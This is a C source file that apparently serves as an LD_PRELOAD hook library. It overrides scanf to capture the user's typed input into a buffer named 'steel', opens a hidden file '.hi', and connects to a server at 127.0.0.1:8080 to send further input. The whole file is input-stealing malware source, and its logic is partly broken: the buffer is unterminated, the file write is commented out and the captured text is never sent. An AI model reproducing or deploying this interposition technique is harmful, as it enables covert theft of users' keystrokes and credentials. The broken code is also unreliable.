#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#define MAX 80
#define PORT 8080
#define SA struct sockaddr

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"
#define TRUE 1
#define FALSE 0
void func(int sockfd)
{
    char buff[MAX];
    int n;
    for (;;) {
        bzero(buff, sizeof(buff));
        printf("Enter the string : ");
        n = 0;
        while ((buff[n++] = getchar()) != '\n')
            ;
        write(sockfd, buff, sizeof(buff));
        bzero(buff, sizeof(buff));
        read(sockfd, buff, sizeof(buff));
        printf("From Server : %s", buff);
        if ((strncmp(buff, "exit", 4)) == 0) {
            printf("Client Exit...\n");
            break;
        }
    }
}



typedef int (*sym)(const char *, ...);
void* handle;
FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit() 
{
	fd = fopen(HIDDEN_FILE,"w");
    handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

void mydest() 
{
    dlclose(handle);
    fclose(fd);
}

int scanf ( const char * format, ... )
{
	char steel[1000];
	char c = 0;
	int i = 0;
	int stoleInput = FALSE;
	while (c != '\n') {
		c = getchar();
		steel[i] = c;
		i++;
		stoleInput = TRUE;
	}
//	fprintf(fd, "%s",steel);


    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("connected to the server..\n");

    // function for chat
    func(sockfd);

    // close the socket
    close(sockfd);




	return stoleInput;	
}
